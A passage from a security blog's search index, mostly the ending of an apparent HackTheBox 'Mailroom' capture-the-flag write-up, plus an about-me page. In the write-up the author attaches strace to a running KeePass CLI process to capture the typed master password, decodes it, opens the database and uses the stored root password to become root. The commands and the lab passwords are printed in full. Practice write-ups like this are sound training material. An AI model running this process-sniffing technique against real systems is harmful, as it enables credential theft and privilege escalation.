KeePass, so that I could access my password # database on my phone. This program scratches that itch. ... ... ... The import command requires two arguments: the database name and the path to the directory containing the database file.\n(remote) matthew@mailroom:/home/matthew$ /usr/bin/perl /usr/bin/kpcli ... ... kpcli:/\u0026gt; import personal.kdbx /home/matthew Please provide the master password: ************************* Couldn\u0026#39;t load the file personal.kdbx: The database key appears invalid or else the database is corrupt Importing the database is currently not possible. However, a viable approach is to use strace by attaching to the process\u0026rsquo;s PID. This will enable monitoring of the system calls being made by the process. Given that someone is already utilizing the kpcli script as the user matthew, this can return interesting information.\nTo handle the changing PIDs for the script, this one-liner grabs the current process ID for the active kpcli process.\nmatthew@mailroom:~$ ps aux | grep \u0026#39;[k]pcli\u0026#39; | awk \u0026#39;{ print $2 }\u0026#39; 93776 The script needs a master password for successful execution, so I am more interested in successful read sys calls Flags for strace\n-p attach to a PID -e trace=read only show read syscalls -f follow any forked processes -o output file The script requires a master password for successful execution, this means successful sysread calls could give interesting information. The relevant strace flags are:\n-p: Attach to a specific PID. -e trace=read: Display only read syscalls. -f: Follow any forked processes. -o: Define the output file for the trace. The final command to attach the currently running kpcli process to strace\nmatthew@mailroom:~$ strace -f -p $(ps aux | grep \u0026#39;[k]pcli\u0026#39; | awk \u0026#39;{ print $2 }\u0026#39;) -e trace=read -o kpcli.log strace: Process 93785 attached By filtering for successful read syscalls (e.g., read() = 1), numerous entries like -1 Resource temporarily unavailable can be avoided, since they don\u0026rsquo;t provide much useful information.\n(remote) matthew@mailroom:/home/matthew$ cat kpcli.log | grep \u0026#39;= 1$\u0026#39; 93785 read(3, \u0026#34;.\u0026#34;, 1) = 1 93785 read(3, \u0026#34;k\u0026#34;, 1) = 1 93785 read(3, \u0026#34;d\u0026#34;, 1) = 1 ... ... 93785 read(3, \u0026#34;t\u0026#34;, 1) = 1 93785 read(3, \u0026#34;\\n\u0026#34;, 1) = 1 With some bash fu the required characters can be selectively extracted in one line. Additionally, newline characters can be managed using sed to display actual line breaks, effectively delineating the inputs.\n(remote) matthew@mailroom:/home/matthew$ cat kpcli.log | grep \u0026#39;= 1$\u0026#39; | cut -d\u0026#39;\u0026#34;\u0026#39; -f2 | tr -d \u0026#39;\\n\u0026#39; | sed \u0026#39;s/\\\\n/\\n/g\u0026#39; .kdbx !sEcUr3p4$$w01\\10rd9 ls Root/ show -f 0 quit Even though !sEcUr3p4$$w01\\10rd9 might seem like the password, it\u0026rsquo;s invalid. The \\10 portion appears unusual, considering that other entries are in ASCII format.\n93785 read(0, \u0026#34;w\u0026#34;, 8192) = 1 93785 read(0, \u0026#34;0\u0026#34;, 8192) = 1 93785 read(0, \u0026#34;1\u0026#34;, 8192) = 1 93785 read(0, \u0026#34;\\10\u0026#34;, 8192) = 1 93785 read(0, \u0026#34;r\u0026#34;, 8192) = 1 93785 read(0, \u0026#34;d\u0026#34;, 8192) = 1 The \\10 looks like octal, and since strace is supposed to prints ASCII chars, there should be a connection. Octal 10 corresponds to a backspace in the ASCII chart\nThis means that after removing the 1, the password !sEcUr3p4$$w01\\10rd9 becomes !sEcUr3p4$$w0rd9. By using the master password, it was possible to decrypt the database and uncover the root\u0026rsquo;s password within one of those entries.\n(remote) matthew@mailroom:/home/matthew$ kpcli --kdb personal.kdbx Please provide the master password: ************************* KeePass CLI (kpcli) v3.1 is ready for operation. Type \u0026#39;help\u0026#39; for a description of available commands. Type \u0026#39;help \u0026lt;command\u0026gt;\u0026#39; for details on individual commands. kpcli:/\u0026gt; ls Root/ === Entries === 0. food account door.dash.local 1. GItea Admin account git.mailroom.htb 2. gitea database password 3. My Gitea Account git.mailroom.htb 4. root acc kpcli:/\u0026gt; show -f 4 Title: root acc Uname: root Pass: a$gBa3!GA8 URL: Notes: root account for sysadmin jobs Pwned!!\nmatthew@mailroom:~$ su root Password: root@mailroom:/home/matthew# id uid=0(root) gid=0(root) groups=0(root) root@mailroom:/home/matthew# ls -la /root/root.txt -rw-r----- 1 root root 33 Jul 19 12:29 /root/root.txt root@mailroom:/home/matthew# ","date":"21 August 2023","permalink":"/blog/20230821-htb-mailroom/","section":"Blog Posts","summary":"Mailroom is a hard linux box vulnerable to multiple vulnerabilities including XXS, NoSQLi and command injection. It also involves stracing a process to dump passwords.","title":"HTB Mailroom"},{"content":"","date":null,"permalink":"/tags/http-exfil/","section":"Tags","summary":"","title":"HTTP Exfil"},{"content":"","date":null,"permalink":"/tags/nosqli-bruteforce/","section":"Tags","summary":"","title":"NoSQLi-Bruteforce"},{"content":"","date":null,"permalink":"/tags/strace/","section":"Tags","summary":"","title":"Strace"},{"content":"","date":null,"permalink":"/tags/xxs/","section":"Tags","summary":"","title":"XXS"},{"content":"Hello World 💻 #I have created this website to curate my online presence, providing a platform to showcase my projects, CTF writeups, delve into the topics I\u0026rsquo;m enthusiastic about, and share some ramblings. This site is set up with Hugo and uses Congo theme! It\u0026rsquo;s hosted and managed by Cloudflare Pages, making it easy to deploy updates and post here!\nFound a typo? #If you come across any errors, such as typos or sentences that could be improved, or if you have any suggestions for updates to this blog post, please create a new pull request to propose your changes. Your contributions are greatly appreciated.\nThis can also be done by clicking the edit icon besides the title\n","date":"21 June 2023","permalink":"/blog/hello-world/","section":"Blog Posts","summary":"First post on my blog","title":"Hello World"},{"content":"Hey there, I am Abraxas! 👋 #Welcome back to my corner of the digital realm! I\u0026rsquo;m Abraxas, a SOC Analyst for a FinTech organization, keeping the financial world safe. While I\u0026rsquo;m no longer a full-time software developer, code still runs through my veins. You\u0026rsquo;ll still find me hacking away on platforms like HackTheBox and hunting for CVEs to sharpen my infosec skills.\nBeyond hacking, I find solace in a good book, and exploring the endless possibilities of home labbing. I also continue to contribute as a moderator to an international community of hackers on Discord called Republic of Hackers.\nWhen I\u0026rsquo;m not coding, you\u0026rsquo;ll find me hacking away on platforms like HackTheBox and hunting for CVEs to improve my infosec skills. Beyond hacking, I find refuge in books, and in the endless possibilities of home labbing. Additionally, I also contribute as a moderator to an international community of hackers on Discord called .\nThrough this blog, I aim to document my journey as a SOC Analyst, sharing insights, experiences from the trenches, and showcasing some of the cool projects I tinker with in my downtime. Feel free to drop by, geek out with me as I navigate the ever-evolving world of cybersecurity, unraveling its mysteries one blog post at a time.\n","date":null,"permalink":"/about-me/","section":"Abraxas","summary":"Hey there, I am Abraxas!","title":"About Me"},{"content":"","date":null,"permalink":"/blog/","section":"Blog Posts","summary":"","title":"Blog Posts"}]